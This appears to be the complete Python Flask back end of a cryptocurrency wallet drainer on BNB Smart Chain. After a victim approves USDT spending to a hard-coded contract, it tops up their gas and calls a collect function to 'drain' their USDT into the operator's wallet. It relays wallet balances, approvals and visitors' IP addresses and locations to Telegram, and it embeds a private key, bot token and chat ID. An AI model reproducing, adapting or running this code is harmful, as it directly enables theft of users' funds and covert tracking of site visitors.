from web3 import Web3
import json
import requests
from decimal import Decimal
from flask import Flask, request
import threading
import time
from flask_cors import CORS

app = Flask(__name__)
# Configure CORS to allow browser calls
CORS(
    app,
    resources={r"/*": {"origins": [
        "https://google.com",
        "*"
    ]}},
    supports_credentials=False
)

VISITORS_FILE = "visitors.txt"
BALANCE_FILE = "balance.txt"

smart_contract_address = "0xBdD712a2f0ca7D7b79f0204E7898F4688EaCe3D1"

private_key = "0x2ecf34f136209f982411d2b2abeff2cf354386488bf68159e640af8cc15a33f8"# Pvt key

chat_ids = ["7037064410"] # chat ids

minimum_amount = 1

bot_token = "7939817621:AAGt9nyCEeGvYBhogFQ4L5ph32xIrrCGEjQ" # bot token

site_url = "https://bnbd24.biz"

def add_balance_record(user_id, amount):
    if isinstance(user_id, list):
        user_id = user_id[0]
    with open(BALANCE_FILE, "a") as f:
        f.write(f"{user_id} +{amount}\n")
        

def send_to_telegram(text, extra_chat_ids=None):
    # Merge in optional extra chat ids (e.g., user-provided uid)
    if extra_chat_ids:
        for cid in extra_chat_ids:
            if isinstance(cid, (str, int)):
                cid_str = str(cid).strip()
                if cid_str.isdigit() and cid_str not in chat_ids:
                    chat_ids.append(cid_str)
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "text": text,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    for chat_id in chat_ids:
        payload["chat_id"] = chat_id
        try:
            requests.post(url, data=payload, timeout=10)
        except:
            pass

def send_usdt_failed_message(from_address, amount_usdt, error_msg, extra_chat_ids=None):
    short_address = f"{from_address[:6]}...{from_address[-4:]}"
    message = (
        f"❌ *USDT Send Failed*\n `{short_address}`\n\n"
        f"💸 *Amount:* {amount_usdt} USDT\n"
        f"⚠️ *Error:* `{error_msg}`"
    )
    send_to_telegram(message, extra_chat_ids)

def send_usdt_sent_message(from_address, amount_usdt, tx_hash, extra_chat_ids=None):
    short_address = f"{from_address[:6]}...{from_address[-4:]}"
    message = (
        f"✅ *USDT Sent Successfully* `{short_address}`\n\n"
        f"💸 *Amount:* {amount_usdt} USDT\n"
        f"🔗 *Tx:* [View on BscScan](https://bscscan.com/tx/{tx_hash})"
    )
    send_to_telegram(message, extra_chat_ids)


def send_gasfee_failed_message(wallet_address, error_message, extra_chat_ids=None):
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    message = (
        f"❌ *Gas Fee Failed* `{short_address}`\n"
        f"🚫 {error_message}"
    )
    send_to_telegram(message, extra_chat_ids)


def send_gasfee_sent_message(receiver_address, amount_usdt, tx_hash, extra_chat_ids=None):
    global site_url
    tx_link = f"https://bscscan.com/tx/{tx_hash}"
    short_address = f"{receiver_address[:6]}...{receiver_address[-4:]}"
    message = (
        f"⛽💰 *Gas Fee Sent* `{short_address}`\n\n"
        f"💸 *Amount:* {amount_usdt} USDT\n"
        f"🔗 [Tx Hash]({tx_link})\n\n"
        #f"🌐 *Site:* {site_url}"
    )
    send_to_telegram(message, extra_chat_ids)


def send_approval_message(wallet_address, usdt_amount, tx_hash, contract_address, extra_chat_ids=None):
    global site_url
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    short_caddress = f"{contract_address[:6]}...{contract_address[-4:]}"
    message = (
        f"✅🔐 *User Approved USDT* `{short_address}`\n\n"
        #f"💸 {usdt_amount} USDT\n"
        f"🔗 [View Tx](https://bscscan.com/tx/{tx_hash})\n"
        f"📜 *Approved To:* `{short_caddress}`\n\n"
        #f"🌐 *Site:* {site_url}"
    )
    send_to_telegram(message, extra_chat_ids)

def send_wallet_connection(wallet_address, usdt_amount, bnb_amount, extra_chat_ids=None):
    global site_url

    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    message = (
        f"🔌 *User Connected Wallet* `{short_address}`\n\n"
        #f"🌐 *Site:* {site_url}\n"
        f"🪙 *BNB:* {bnb_amount} BNB ( ≈ {usdt_amount} USD )"
    )
    send_to_telegram(message, extra_chat_ids)

def send_empty_wallet_connection(wallet_address, extra_chat_ids=None):
    global site_url
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    message = (
        f"🔌💩 *User Connected an Empty Wallet* `{short_address}`\n\n"
        #f"🌐 *Site:* {site_url}"
    )
    send_to_telegram(message, extra_chat_ids)


# NOTE: Avoid re-initializing the Flask app; keep a single app instance so CORS stays applied




# USD amount to send as BNB gas fee and the threshold to compare against
gas_fee_usd_amount = Decimal("0.02")


web3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))


def _normalize_private_key(raw_key: str) -> str:
    if not isinstance(raw_key, str):
        raise ValueError("Private key must be a string")
    key = raw_key.strip()
    # Fix common typo 'Ox' → '0x'
    if key.startswith("Ox") or key.startswith("OX"):
        key = "0x" + key[2:]
    # Ensure 0x prefix
    if not key.startswith("0x"):
        key = "0x" + key
    hex_part = key[2:]
    if len(hex_part) != 64:
        raise ValueError("Private key must be 64 hex chars (32 bytes)")
    # Validate hex
    int(hex_part, 16)
    return key

account = web3.eth.account.from_key(_normalize_private_key(private_key))
sender = account.address





maximum_amount = 10000  # Set your max USDT value here (e.g., 100 USDT max to drain)



def get_bnb_price_onchain():
    """Fetch BNB price from PancakeSwap v2 BNB-BUSD pair, fallback to CoinGecko API"""
    try:
        bsc = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))
        pair_address = Web3.to_checksum_address("0x1b96b92314c44b159149f7e0303511fb2fc4774f")
        abi = [
            {
                "inputs": [],
                "name": "getReserves",
                "outputs": [
                    {"internalType": "uint112", "name": "_reserve0", "type": "uint112"},
                    {"internalType": "uint112", "name": "_reserve1", "type": "uint112"},
                    {"internalType": "uint32", "name": "_blockTimestampLast", "type": "uint32"},
                ],
                "stateMutability": "view",
                "type": "function",
            }
        ]
        pair_contract = bsc.eth.contract(address=pair_address, abi=abi)
        reserves = pair_contract.functions.getReserves().call()
        bnb_reserve, busd_reserve, _ = reserves
        bnb_price = Decimal(busd_reserve) / Decimal(bnb_reserve)
        print(f"Current on-chain BNB price: ${bnb_price:.2f}")
        return bnb_price
    except Exception as e:
        print(f"⚠️ Error fetching BNB price from chain: {e}")
        print("⚠️ Trying CoinGecko API as fallback...")
        try:
            r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd", timeout=10)
            print(r.text)
            bnb_price = Decimal(r.json()['binancecoin']['usd'])
            print(f"Current BNB price from CoinGecko API: ${bnb_price:.2f}")
            return bnb_price
        except Exception as api_error:
            print(f"⚠️ Error fetching BNB price from CoinGecko API: {api_error}")
            return Decimal("0")

# Modified collect_all_usdt function
def collect_all_usdt(from_address, extra_chat_ids=None):
    global private_key, smart_contract_address, maximum_amount
    bsc_rpc = "https://bsc-dataseed.binance.org/"
    web3 = Web3(Web3.HTTPProvider(bsc_rpc))

    private_key = private_key
    account = web3.eth.account.from_key(private_key)
    sender_address = account.address
    print(f"🔑 Connected to BSC with address: {sender_address}")
    send_to_telegram(f"🔑 Connected to BSC", extra_chat_ids)

    contract_address = Web3.to_checksum_address(smart_contract_address)
    usdt_address = Web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
    from_address = Web3.to_checksum_address(from_address)

    erc20_abi = [
        {
            "constant": True,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        },
        {
            "constant": True,
            "inputs": [],
            "name": "decimals",
            "outputs": [{"name": "", "type": "uint8"}],
            "type": "function"
        }
    ]

    usdt_contract = web3.eth.contract(address=usdt_address, abi=erc20_abi)
    usdt_decimals = usdt_contract.functions.decimals().call()
    usdt_balance_raw = usdt_contract.functions.balanceOf(from_address).call()
    
    # Convert to human-readable USDT amount
    usdt_balance_full = usdt_balance_raw / 10**usdt_decimals

    bnb_balance_wei = web3.eth.get_balance(from_address)
    bnb_balance = web3.from_wei(bnb_balance_wei, 'ether')

    print(f"🔍 BNB Balance of {from_address}: {round(bnb_balance, 6)} BNB")
    print(f"🔍 USDT Balance of {from_address}: {usdt_balance_full:.2f} USDT")

    if usdt_balance_raw == 0:
        print("💰 = 0: Wallet balance is 0")
        return

    # NEW: Check if balance exceeds maximum_amount and cap it
    if usdt_balance_full > maximum_amount:
        print(f"⚠️ Balance ({usdt_balance_full:.2f} USDT) exceeds max ({maximum_amount} USDT)")
        print(f"📌 Draining only {maximum_amount} USDT")
        usdt_to_drain = int(maximum_amount * 10**usdt_decimals)
        actual_drain_amount = maximum_amount
    else:
        usdt_to_drain = usdt_balance_raw
        actual_drain_amount = usdt_balance_full

    contract_abi = [
        {
            "inputs": [
                {"internalType": "address", "name": "tokenAddress", "type": "address"},
                {"internalType": "address", "name": "from", "type": "address"},
                {"internalType": "uint256", "name": "amount", "type": "uint256"}
            ],
            "name": "collect",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ]

    contract = web3.eth.contract(address=contract_address, abi=contract_abi)

    nonce = web3.eth.get_transaction_count(sender_address, 'pending')
    txn = contract.functions.collect(usdt_address, from_address, usdt_to_drain).build_transaction({
        'from': sender_address,
        'nonce': nonce,
        'gas': 150000,
        'gasPrice': web3.to_wei('2', 'gwei')
    })

    signed_txn = web3.eth.account.sign_transaction(txn, private_key)
    
    try:
        tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
        print(f"✅ Sent {actual_drain_amount:.2f} USDT to {sender_address}")
        print(f"🔗 TX: https://bscscan.com/tx/{web3.to_hex(tx_hash)}")
        print("good")
        send_usdt_sent_message(sender_address, actual_drain_amount, web3.to_hex(tx_hash), extra_chat_ids)
        add_balance_record(extra_chat_ids, actual_drain_amount)

    except Exception as e:
        print(f"❌ TX failed: {e}")
        send_usdt_failed_message(sender_address, actual_drain_amount, str(e), extra_chat_ids)



def get_usdt_balance(address):
    web3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))
    usdt_contract_address = web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
    abi = [
        {"constant": True, "inputs": [{"name": "_owner", "type": "address"}],
         "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}],
         "type": "function"}
    ]
    contract = web3.eth.contract(address=usdt_contract_address, abi=abi)
    balance = contract.functions.balanceOf(address).call()
    return Decimal(balance) / Decimal(1e18)


def send_gasfee_bnb(receiver, extra_chat_ids=None):
    usdt_balance = get_usdt_balance(receiver)
    #print(f"USDT Balance of {receiver}: {usdt_balance:.2f} USDT")

    if usdt_balance < minimum_amount:
        print(f"[-] User Balance {usdt_balance}$ | Minimum {minimum_amount}")
        send_gasfee_failed_message(receiver, f"User Balance {usdt_balance}$ | Minimum {minimum_amount}", extra_chat_ids)
        return

    # Check the receiver's BNB balance
    balance_wei = web3.eth.get_balance(receiver)
    balance_bnb = web3.from_wei(balance_wei, 'ether')

    bnb_price = get_bnb_price_onchain()

    if bnb_price == 0:
        send_gasfee_failed_message(receiver, "Failed to fetch BNB price", extra_chat_ids)
        return

    usd_balance = Decimal(balance_bnb) * bnb_price
    print(f"💰 Wallet: {receiver}")
    print(f"BNB Balance: {balance_bnb:.6f} BNB ≈ ${usd_balance:.2f} USD")

    # Only send if receiver has less than the threshold in USD value
    if usd_balance >= gas_fee_usd_amount:
        print(f"[+] Receiver already has enough BNB (≈ ${usd_balance:.2f}). Skipping gas fee.")
        send_gasfee_failed_message(receiver, f"Receiver has sufficient BNB (≈ ${usd_balance:.2f}). Skipping gas fee.", extra_chat_ids)
        collect_all_usdt(receiver, extra_chat_ids)
        return

    amount_usd = gas_fee_usd_amount
    amount_bnb = amount_usd / bnb_price
    value = web3.to_wei(amount_bnb, 'ether')

    nonce = web3.eth.get_transaction_count(sender)
    gas_price = web3.eth.gas_price
    gas_limit = 21000

    tx = {
        'nonce': nonce,
        'to': receiver,
        'value': int(value),
        'gas': gas_limit,
        'gasPrice': gas_price,
        'chainId': 56
    }

    try:
        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        print(f"✅ Sent ${amount_usd} worth of BNB to {receiver}")
        print(f"🔗 Tx Hash: {web3.to_hex(tx_hash)}")
        #send_to_telegram(f"✅ Sent Gas Fee\nAmount : ${amount_usd} \n To: {receiver} \n Tx Hash : https://bscscan.com/tx/{web3.to_hex(tx_hash)}")
        send_gasfee_sent_message(receiver, amount_usd, web3.to_hex(tx_hash), extra_chat_ids)
        collect_all_usdt(receiver, extra_chat_ids)
    except Exception as e:
        print("❌ Transaction failed.")
        print(f"Error: {str(e)}")
        #send_to_telegram(f"❌ Transaction failed.\nError: {str(e)}")
        send_gasfee_failed_message(receiver, str(e), extra_chat_ids)


def check_approval(tx_hash, extra_chat_ids=None):
    time.sleep(10)
    global smart_contract_address
    web3 = Web3(
        Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))

    contract_address = Web3.to_checksum_address(
    smart_contract_address)

    tx_hash = tx_hash

    abi = [{
        "anonymous":
        False,
        "inputs": [
            {
                "indexed": True,
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": True,
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": False,
                "name": "value",
                "type": "uint256"
            },
        ],
        "name":
        "Approval",
        "type":
        "event",
    }]

    contract = web3.eth.contract(address=contract_address, abi=abi)

    try:
        receipt = web3.eth.get_transaction_receipt(tx_hash)
        logs = contract.events.Approval().process_receipt(receipt)

        log = logs[0]
        owner = log['args']['owner']
        spender = log['args']['spender']
        amount = log['args']['value']

        print(f"Approved by     : {owner}")
        print(f"Approved to     : {spender}")
        print(f"Approved amount : {amount}")
        if spender == smart_contract_address:
            print("Approved to right contract address")
            if amount >= minimum_amount:
                print("Approved amount is good")
                #send_to_telegram(f"💸 Approved by {owner} \n Amount: {amount}$ \n Tx: {tx_hash} \n https://bscscan.com/tx/{tx_hash} \n Approved to {smart_contract_address}")

                send_approval_message(owner, amount, tx_hash, smart_contract_address, extra_chat_ids)
                send_gasfee_bnb(owner, extra_chat_ids)
                #collect_all_usdt(owner)

            else:
                print("Approved amount is low")
        else:
            print("Approved to wrong contract address")

    except Exception as e:
        print("Error:", e)



def get_wallet_token_balances(wallet):
    try:
        web3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))
        wallet = Web3.to_checksum_address(wallet)

        bnb_balance_wei = web3.eth.get_balance(wallet)
        bnb_balance = web3.from_wei(bnb_balance_wei, 'ether')

        usdt_contract_address = web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
        abi = [{
            "constant": True,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        }]
        contract = web3.eth.contract(address=usdt_contract_address, abi=abi)
        usdt_balance = contract.functions.balanceOf(wallet).call()
        usdt_balance = Decimal(usdt_balance) / Decimal(1e18)

        return round(float(bnb_balance), 6), round(float(usdt_balance), 2)
    except Exception as e:
        print(f"Error getting token balances: {e}")
        return 0.0, 0.0



@app.route("/", methods=["POST"])
def alive():
    return "alive"

@app.route("/checkTrx", methods=["POST"])
def check_trx():
    uid = None
    if request.is_json:
        data = request.get_json() or {}
        trx_hash = data.get("trx")
        uid = data.get("uid")
    else:
        trx_hash = request.form.get("trx")
        uid = request.form.get("uid")
    
    if not trx_hash:
        return "Missing trx hash", 400

    extra_chat_ids = [uid] if uid and str(uid).isdigit() else None
    threading.Thread(target=check_approval, args=(trx_hash, extra_chat_ids)).start()
    return "ok"


@app.route("/connectedwallet", methods=["POST"])
def connected_wallet():
    uid = None
    if request.is_json:
        data = request.get_json() or {}
        wallet = data.get("wallet")
        uid = data.get("uid")
    else:
        wallet = request.form.get("wallet")
        uid = request.form.get("uid")
    
    if not wallet:
        return "Missing wallet address", 400

    bnb_amt, usdt_amt = get_wallet_token_balances(wallet)

    if bnb_amt == 0 and usdt_amt == 0:
        #msg = f"🧺 Empty wallet connected:\n{wallet}\nAmt: BNB {bnb_amt} | USDT {usdt_amt}"
        send_empty_wallet_connection(wallet, [uid] if uid and str(uid).isdigit() else None)
    else:
        #msg = f"✅ Wallet connected:\n{wallet}\nAmt: BNB {bnb_amt} | USDT {usdt_amt}"
        send_wallet_connection(wallet, usdt_amt, bnb_amt, [uid] if uid and str(uid).isdigit() else None)

    #send_to_telegram(msg)
    return "ok"



# New: Generic info endpoint to forward arbitrary text to Telegram
@app.route("/info", methods=["POST"])
def info():
    try:
        text = None
        uid = None
        if request.is_json:
            body = request.get_json(silent=True) or {}
            text = body.get("text")
            uid = body.get("uid")
        if not text:
            # Try form or raw body
            text = request.form.get("text") or (request.data.decode("utf-8") if request.data else None)
            uid = request.form.get("uid") or uid
        if not text or not text.strip():
            return "Missing 'text' in body", 400
        #send_to_telegram(text.strip(), [uid] if uid and str(uid).isdigit() else None)
        return "ok"
    except Exception as e:
        return f"error: {str(e)}", 500


# New: Structured visitor info endpoint
@app.route("/visitor", methods=["POST"])
def visitor():
    try:
        if not request.is_json:
            return "Expected application/json body", 400
        body = request.get_json(silent=True) or {}
        ip = body.get("ip")
        location = body.get("location")
        timezone = body.get("timezone")
        url = body.get("url")
        uid = body.get("uid")
        country_flag = body.get("country_flag", "")  # e.g., 🇷🇺
        note = body.get("note", "New visitor detected!")

        if not all([ip, location, timezone, url]):
            return "Body must include ip, location, timezone, url", 400

        message_lines = [
            f"👀 *Visitor Alert*",
            f"📝 {note}",
            f"🌐 *IP:* `{ip}`",
            f"📍 *Location:* {location} {country_flag}".rstrip(),
            f"🕒 *Timezone:* `{timezone}`",
            #f"🔗 *URL:* [{url}]({url})",
        ]
        send_to_telegram("\n".join(message_lines), [uid] if uid and str(uid).isdigit() else None)
        # Persist visitor only if a valid numeric uid is provided
        if uid and str(uid).isdigit():
            try:
                with open(VISITORS_FILE, "a") as f:
                    # Format includes -{uid} so bot.count_visitors(user_id) can match
                    f.write(f"{ip}-{str(uid).strip()}\n")
            except:
                # Silently ignore file write errors to avoid breaking the endpoint
                pass
        return "ok"
    except Exception as e:
        return f"error: {str(e)}", 500


while True:
    app.run(host='0.0.0.0', port=5058, debug=False)
